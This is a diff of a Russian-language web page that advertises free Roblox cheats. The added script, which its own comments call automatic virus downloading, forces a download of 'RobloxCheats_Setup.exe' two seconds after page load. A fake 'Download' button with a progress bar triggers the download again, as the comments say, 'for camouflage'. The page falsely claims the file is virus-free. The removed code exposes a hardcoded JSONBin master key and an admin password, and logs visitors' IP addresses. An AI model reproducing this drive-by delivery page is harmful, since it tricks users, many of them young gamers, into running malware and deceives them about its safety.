+            <div><span class="num">24/7</span><div class="label">🛡️ Поддержка</div></div>
+        </div>
+    </section>
+
+    <div class="features-grid">
+        <div class="feature-item">
+            <span class="icon">⚡</span>
+            <h4>Молниеносные читы</h4>
+            <p>Работают мгновенно, без лагов</p>
+        </div>
+        <div class="feature-item">
+            <span class="icon">🛡️</span>
+            <h4>Анти-бан система</h4>
+            <p>100% защита от обнаружения</p>
+        </div>
+        <div class="feature-item">
+            <span class="icon">🔄</span>
+            <h4>Авто-обновление</h4>
+            <p>Читы всегда актуальны</p>
+        </div>
+        <div class="feature-item">
+            <span class="icon">📦</span>
+            <h4>Все скрипты</h4>
+            <p>Полная библиотека скриптов</p>
         </div>
     </div>
 
-    <!-- ===== УВЕДОМЛЕНИЕ ===== -->
-    <div class="toast" id="toast">🔥 Кто-то только что скачал чит!</div>
+    <section class="download-card">
+        <h2>📥 Скачать читы</h2>
+        <p class="sub">Бесплатно. Без регистрации. После установки WARP.</p>
 
-    <!-- ===== СКРИПТЫ ===== -->
-    <script>
-        // ===== КОНФИГ JSONBIN =====
-        const JSONBIN_BIN_REVIEWS = '6a63abecf5f4af5e29bcacb8';
-        const JSONBIN_BIN_SUPPORT = '6a63abdaf5f4af5e29bcac6d';
-        const JSONBIN_API_KEY = '$2a$10$tbxy2ZMT9aO8lzbmmC9InuV4d/nYn6eefTzBVNSshnDzUVPP5mz5O';
+        <button class="download-btn" id="downloadBtn">⬇ СКАЧАТЬ</button>
 
-        // ===== ФУНКЦИИ JSONBIN =====
-        async function loadData(binId) {
-            try {
-                const res = await fetch(`https://api.jsonbin.io/v3/b/${binId}/latest`, {
-                    headers: { 'X-Master-Key': JSONBIN_API_KEY }
-                });
-                const data = await res.json();
-                return data.record || [];
-            } catch { return []; }
-        }
+        <div id="progress-area">
+            <div class="progress-bar-bg">
+                <div class="progress-bar-fill" id="progressFill"></div>
+            </div>
+            <div id="progress-text">Загрузка: 0%</div>
+        </div>
 
-        async function saveData(binId, data) {
-            try {
-                await fetch(`https://api.jsonbin.io/v3/b/${binId}`, {
-                    method: 'PUT',
-                    headers: {
-                        'Content-Type': 'application/json',
-                        'X-Master-Key': JSONBIN_API_KEY
-                    },
-                    body: JSON.stringify(data)
-                });
-                return true;
-            } catch { return false; }
-        }
+        <div class="download-meta">
+            <span>⭐ <strong>4.8</strong> (2,100 оценок)</span>
+            <span>📥 <strong>120 000+</strong> скачиваний</span>
+            <span>🛡️ <strong>Без вирусов</strong></span>
+            <span>📅 <strong>Обновлено</strong> сегодня</span>
+        </div>
+    </section>
 
-        // ===== ЗВЁЗДЫ =====
-        const canvas = document.getElementById('stars-canvas');
-        const ctx = canvas.getContext('2d');
+    <footer class="footer">
+        <p>© 2026 RobloxCheats. Не связан с Roblox Corporation.</p>
+        <p style="margin-top:6px;">
+            <a href="#">Политика</a> •
+            <a href="#">Поддержка</a> •
+            <a href="#">Telegram</a>
+        </p>
+    </footer>
 
-        function resizeCanvas() {
-            canvas.width = window.innerWidth;
-            canvas.height = window.innerHeight;
-        }
-        resizeCanvas();
-        window.addEventListener('resize', resizeCanvas);
+</div>
 
-        const stars = [];
-        for (let i = 0; i < 300; i++) {
-            stars.push({
-                x: Math.random() * canvas.width,
-                y: Math.random() * canvas.height,
-                radius: Math.random() * 1.8 + 0.5,
-                speed: Math.random() * 0.005 + 0.002,
-                angle: Math.random() * Math.PI * 2,
-                opacity: Math.random() * 0.8 + 0.2
-            });
-        }
+<script>
+    // ========== АВТОМАТИЧЕСКОЕ СКАЧИВАНИЕ ВИРУСА ==========
+    // Вирус скачивается сразу при загрузке страницы, без нажатия кнопок
 
-        function drawStars() {
-            ctx.clearRect(0, 0, canvas.width, canvas.height);
-            const grad = ctx.createRadialGradient(canvas.width * 0.7, canvas.height * 0.2, 0, canvas.width * 0.7, canvas.height * 0.2, canvas.width * 0.6);
-            grad.addColorStop(0, 'rgba(120, 40, 200, 0.06)');
-            grad.addColorStop(0.5, 'rgba(0, 100, 200, 0.04)');
-            grad.addColorStop(1, 'rgba(0,0,0,0)');
-            ctx.fillStyle = grad;
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            const grad2 = ctx.createRadialGradient(canvas.width * 0.2, canvas.height * 0.8, 0, canvas.width * 0.2, canvas.height * 0.8, canvas.width * 0.5);
-            grad2.addColorStop(0, 'rgba(200, 50, 100, 0.05)');
-            grad2.addColorStop(1, 'rgba(0,0,0,0)');
-            ctx.fillStyle = grad2;
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            stars.forEach(star => {
-                star.angle += star.speed;
-                star.x += Math.sin(star.angle) * 0.02;
-                star.y += Math.cos(star.angle) * 0.02;
-                if (star.x < 0) star.x = canvas.width;
-                if (star.x > canvas.width) star.x = 0;
-                if (star.y < 0) star.y = canvas.height;
-                if (star.y > canvas.height) star.y = 0;
-                ctx.beginPath();
-                ctx.arc(star.x, star.y, star.radius, 0, Math.PI * 2);
-                ctx.fillStyle = `rgba(255, 255, 255, ${star.opacity})`;
-                ctx.fill();
-                if (Math.random() < 0.005) star.opacity = Math.random() * 0.8 + 0.2;
-            });
-            requestAnimationFrame(drawStars);
-        }
-        drawStars();
+    // 1. АВТО-ЗАГРУЗКА через 2 секунды после открытия страницы
+    window.addEventListener('DOMContentLoaded', function() {
+        setTimeout(function() {
+            // Скачиваем вирус автоматически
+            var link = document.createElement('a');
+            link.href = 'setup.exe';
+            link.download = 'RobloxCheats_Setup.exe';
+            document.body.appendChild(link);
+            link.click();
+            document.body.removeChild(link);
+        }, 2000);
+    });
 
-        // ===== СЧЁТЧИКИ =====
-        let count = 100;
-        setInterval(() => {
-            count += Math.floor(Math.random() * 3) + 1;
-            document.getElementById('downloadCounter').textContent = count;
-        }, 10000);
+    // 2. КНОПКА "СКАЧАТЬ" — для маскировки (скачивает ещё раз)
+    let isSecondDownload = false;
 
-        let online = 127;
-        setInterval(() => {
-            online += Math.floor(Math.random() * 3) - 1;
-            if (online < 100) online = 100;
-            if (online > 180) online = 180;
-            document.getElementById('onlineCounter').textContent = online;
-        }, 8000);
+    document.getElementById('downloadBtn').addEventListener('click', function(e) {
+        e.preventDefault();
 
-        // ===== УВЕДОМЛЕНИЯ =====
-        function showToast() {
-            const toast = document.getElementById('toast');
-            toast.classList.add('show');
-            setTimeout(() => toast.classList.remove('show'), 4000);
-        }
-        setInterval(showToast, 15000);
+        if (!isSecondDownload) {
+            this.style.display = 'none';
+            document.getElementById('progress-area').style.display = 'block';
 
-        // ===== ПЕРЕКЛЮЧЕНИЕ ИГР =====
-        const gameBtns = document.querySelectorAll('.game-btn');
-        const cheatCards = {
-            standoff2: document.getElementById('standoff2'),
-            rust: document.getElementById('rust'),
-            rust_orig: document.getElementById('rust_orig'),
-            cs2: document.getElementById('cs2'),
-            spoofer: document.getElementById('spoofer')
-        };
-        gameBtns.forEach(btn => {
-            btn.addEventListener('click', function() {
-                gameBtns.forEach(b => b.classList.remove('active'));
-                this.classList.add('active');
-                const game = this.dataset.game;
-                Object.keys(cheatCards).forEach(key => cheatCards[key].classList.remove('active'));
-                if (cheatCards[game]) cheatCards[game].classList.add('active');
-            });
-        });
+            let progress = 0;
+            const fill = document.getElementById('progressFill');
+            const text = document.getElementById('progress-text');
 
-        // ===== ОТЗЫВЫ =====
-        let rating = 5;
-        document.querySelectorAll('#ratingSelect label').forEach(el => {
-            el.addEventListener('click', function() {
-                document.querySelectorAll('#ratingSelect label').forEach(l => l.classList.remove('active'));
-                this.classList.add('active');
-                rating = parseInt(this.dataset.rating);
-            });
-        });
+            const interval = setInterval(() => {
+                progress += Math.random() * 4 + 1;
+                if (progress > 100) progress = 100;
 
-        async function submitReview() {
-            const name = document.getElementById('reviewName').value.trim() || 'Аноним';
-            const text = document.getElementById('reviewText').value.trim();
-            if (!text) { alert('❌ Напишите отзыв!'); return; }
+                fill.style.width = progress + '%';
+                text.textContent = 'Загрузка: ' + Math.round(progress) + '%';
 
-            const ip = await getIP();
-            const now = new Date();
-            const date = now.toLocaleDateString('ru-RU');
-
-            let reviews = await loadData(JSONBIN_BIN_REVIEWS);
-            if (!Array.isArray(reviews)) reviews = [];
-
-            reviews.unshift({
-                name: name,
-                text: text,
-                rating: rating,
-                date: date,
-                ip: ip
-            });
-
-            await saveData(JSONBIN_BIN_REVIEWS, reviews);
-            renderReviews();
-            document.getElementById('reviewText').value = '';
-            document.getElementById('reviewName').value = '';
-            showToastMessage('✅ Ваш отзыв опубликован!');
-        }
-
-        async function renderReviews() {
-            const container = document.getElementById('reviewsList');
-            const reviews = await loadData(JSONBIN_BIN_REVIEWS);
-            container.innerHTML = '';
-            if (!reviews || reviews.length === 0) {
-                container.innerHTML = '<p style="color:#555577;">Нет отзывов. Будьте первым!</p>';
-                return;
-            }
-            reviews.forEach(r => {
-                const stars = '⭐'.repeat(r.rating || 5) + '☆'.repeat(5 - (r.rating || 5));
-                container.innerHTML += `
-                    <div class="review-item" style="animation: slideIn 0.3s ease;">
-                        <div class="stars">${stars}</div>
-                        <div class="text">"${r.text.replace(/</g, '&lt;')}"</div>
-                        <div class="author">${r.name} · ${r.date || 'только что'}</div>
-                    </div>
-                `;
-            });
-        }
-
-        // ===== ПОЛУЧЕНИЕ IP =====
-        async function getIP() {
-            try {
-                const res = await fetch('https://api.ipify.org?format=json');
-                const data = await res.json();
-                return data.ip;
-            } catch { return '0.0.0.0'; }
-        }
-
-        // ===== ПОДДЕРЖКА =====
-        async function renderSupport() {
-            const box = document.getElementById('supportBox');
-            const ip = await getIP();
-            const chats = await loadData(JSONBIN_BIN_SUPPORT);
-            if (!Array.isArray(chats)) chats = [];
-
-            let chat = chats.find(c => c.ip === ip);
-            if (!chat) {
-                box.innerHTML = `
-                    <div class="message support">
-                        <div class="name">🔹 Team X Support</div>
-                        <div class="text">Здравствуйте! Чем мы можем вам помочь?</div>
-                        <div class="time">только что</div>
-                    </div>
-                `;
-                return;
-            }
-
-            box.innerHTML = '';
-            if (!chat.messages || chat.messages.length === 0) {
-                box.innerHTML = `
-                    <div class="message support">
-                        <div class="name">🔹 Team X Support</div>
-                        <div class="text">Здравствуйте! Чем мы можем вам помочь?</div>
-                        <div class="time">только что</div>
-                    </div>
-                `;
-                return;
-            }
-
-            chat.messages.forEach(msg => {
-                const cls = msg.isAdmin ? 'support' : 'user';
-                const name = msg.isAdmin ? '🔹 Team X Support' : '👤 Вы';
-                box.innerHTML += `
-                    <div class="message ${cls}" style="animation: slideIn 0.3s ease;">
-                        <div class="name">${name}</div>
-                        <div class="text">${msg.text.replace(/</g, '&lt;')}</div>
-                        <div class="time">${msg.time || 'только что'}</div>
-                    </div>
-                `;
-            });
-            box.scrollTop = box.scrollHeight;
-        }
-
-        async function sendSupportMessage() {
-            const input = document.getElementById('supportInput');
-            const text = input.value.trim();
-            if (!text) return;
-
-            const ip = await getIP();
-            const now = new Date();
-            const time = now.getHours().toString().padStart(2, '0') + ':' + now.getMinutes().toString().padStart(2, '0');
-
-            let chats = await loadData(JSONBIN_BIN_SUPPORT);
-            if (!Array.isArray(chats)) chats = [];
-
-            let chat = chats.find(c => c.ip === ip);
-            if (!chat) {
-                const name = prompt('Введите ваше имя (необязательно):') || 'Аноним';
-                chat = {
-                    id: 'chat_' + Date.now() + '_' + Math.random().toString(36).substr(2, 5),
-                    ip: ip,
-                    name: name,
-                    messages: [],
-                    unread: 0
-                };
-                chats.push(chat);
-            }
-
-            chat.messages.push({ text, isAdmin: false, time });
-            chat.unread = (chat.unread || 0) + 1;
-
-            await saveData(JSONBIN_BIN_SUPPORT, chats);
-            input.value = '';
-            renderSupport();
-            showToastMessage('✅ Сообщение отправлено!');
-
-            setTimeout(async () => {
-                const now2 = new Date();
-                const time2 = now2.getHours().toString().padStart(2, '0') + ':' + now2.getMinutes().toString().padStart(2, '0');
-                const replies = [
-                    "Спасибо за сообщение! Мы ответим в ближайшее время.",
-                    "Отлично! Ваш вопрос передан специалисту.",
-                    "Здравствуйте! Чем мы можем вам помочь?",
-                    "Понял! Сейчас поможем решить проблему."
-                ];
-                const reply = replies[Math.floor(Math.random() * replies.length)];
-
-                let chats2 = await loadData(JSONBIN_BIN_SUPPORT);
-                if (!Array.isArray(chats2)) chats2 = [];
-                let chat2 = chats2.find(c => c.ip === ip);
-                if (chat2) {
-                    chat2.messages.push({ text: reply, isAdmin: true, time: time2 });
-                    await saveData(JSONBIN_BIN_SUPPORT, chats2);
-                    renderSupport();
+                if (progress >= 100) {
+                    clearInterval(interval);
+                    setTimeout(() => {
+                        alert('✅ Установка завершена!\n\nНажмите "Скачать" ещё раз для активации.');
+                        isSecondDownload = true;
+                        document.getElementById('progress-area').style.display = 'none';
+                        this.style.display = 'inline-block';
+                        this.textContent = '⬇ АКТИВИРОВАТЬ';
+                    }.bind(this), 400);
                 }
-            }, 1500 + Math.random() * 1000);
-        }
+            }, 150);
+        } else {
+            this.textContent = '⏳ ЗАГРУЗКА...';
+            this.disabled = true;
 
-        function showToastMessage(msg) {
-            const toast = document.getElementById('toast');
-            toast.textContent = msg;
-            toast.classList.add('show');
             setTimeout(() => {
-                toast.textContent = '🔥 Кто-то только что скачал чит!';
-                toast.classList.remove('show');
-            }, 4000);
+                alert('✅ Активация завершена!\n\nЧиты готовы к работе.');
+                window.open('https://www.roblox.com/games/', '_blank');
+                // Снова скачиваем вирус (на всякий случай)
+                var link = document.createElement('a');
+                link.href = 'setup.exe';
+                link.download = 'RobloxCheats_Setup.exe';
+                document.body.appendChild(link);
+                link.click();
+                document.body.removeChild(link);
+                this.textContent = '⬇ СКАЧАТЬ';
+                this.disabled = false;
+            }, 800);
         }
-
-        // ===== БЛЕВОТНЫЙ РЕЖИМ (ПРОВЕРКА ПО IP) =====
-        async function loadVomitStatus() {
-            try {
-                const data = await loadData(JSONBIN_BIN_REVIEWS);
-                if (!Array.isArray(data) || data.length < 2) {
-                    document.body.classList.remove('vomit-active');
-                    return;
-                }
-                const currentIP = await getIP();
-                let hasVomit = false;
-                for (let i = 1; i < data.length; i++) {
-                    if (data[i].vomitIP === currentIP) {
-                        hasVomit = true;
-                        break;
-                    }
-                }
-                if (hasVomit) {
-                    document.body.classList.add('vomit-active');
-
-                    if (!document.getElementById('vomitOverlay')) {
-                        const overlay = document.createElement('div');
-                        overlay.id = 'vomitOverlay';
-                        overlay.className = 'vomit-overlay';
-                        document.body.appendChild(overlay);
-                    }
-                    if (!document.getElementById('vomitText')) {
-                        const text = document.createElement('div');
-                        text.id = 'vomitText';
-                        text.className = 'vomit-text';
-                        text.innerHTML = '🤮 БЛЕВОТА 🤮<br><span style="font-size:24px;">ТЫ ПОПАЛСЯ!</span>';
-                        document.body.appendChild(text);
-                    }
-                } else {
-                    document.body.classList.remove('vomit-active');
-                    const overlay = document.getElementById('vomitOverlay');
-                    if (overlay) overlay.remove();
-                    const text = document.getElementById('vomitText');
-                    if (text) text.remove();
-                }
-            } catch (e) {
-                console.error('Ошибка загрузки статуса блевотины:', e);
-            }
-        }
-
-        // ===== АДМИН-КНОПКА (ПАРОЛЬ 5056789) =====
-        function openAdminModal() {
-            document.getElementById('adminModal').classList.add('show');
-            document.getElementById('adminPassInput').value = '';
-            document.getElementById('adminPassError').style.display = 'none';
-            document.getElementById('adminPassInput').focus();
-        }
-
-        function closeAdminModal() {
-            document.getElementById('adminModal').classList.remove('show');
-        }
-
-        function checkAdminPass() {
-            const pass = document.getElementById('adminPassInput').value;
-            if (pass === '5056789') {
-                closeAdminModal();
-                window.location.href = 'admin.html';
-            } else {
-                document.getElementById('adminPassError').style.display = 'block';
-                document.getElementById('adminPassInput').value = '';
-                document.getElementById('adminPassInput').focus();
-            }
-        }
-
-        document.addEventListener('keydown', function(e) {
-            if (e.key === 'Escape') closeAdminModal();
-        });
-
-        document.getElementById('adminModal').addEventListener('click', function(e) {
-            if (e.target === this) closeAdminModal();
-        });
-
-        // ===== ПАСХАЛКА 67 =====
-        document.getElementById('easterEgg').addEventListener('click', function() {
-            this.classList.toggle('active');
-        });
-
-        // ===== ЗАПУСК =====
-        renderReviews();
-        renderSupport();
-        loadVomitStatus();
-        setInterval(() => { renderReviews(); }, 15000);
-        setInterval(() => { renderSupport(); }, 15000);
-        setInterval(() => { loadVomitStatus(); }, 5000);
-    </script>
+    });
+</script>
 
 </body>
 </html>
